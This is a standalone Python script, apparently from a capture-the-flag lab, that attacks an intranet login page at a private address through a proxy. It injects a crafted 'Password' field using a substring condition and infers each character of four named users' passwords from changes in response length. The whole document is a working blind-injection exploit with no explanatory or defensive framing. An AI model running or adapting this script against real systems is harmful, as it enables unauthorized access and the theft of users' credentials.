#!/usr/bin/env python
import requests, string
 
alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\()*+,-./:;<=>?@[\\]^_`{|}~'
users = ['rita', 'jim', 'bryan', 'sarah']
for user in users:
	d = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
	r = requests.post("http://172.31.179.1/intranet.php", data=d, proxies={'http':'http://10.10.10.200:3128'})
	base_size = len(r.text)
	pw = ''
	for i in range(1,255):
		found = False
		for c in alphabet:
			d = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + c + ""}
			r = requests.post("http://172.31.179.1/intranet.php", data=d, proxies={'http':'http://10.10.10.200:3128'})
			if len(r.text) != base_size:
				found = True
				break
		if not found:
			break
		print('guessed {0} char {1} = {2}'.format(user, i, c))
		pw += c
	print(user, pw)
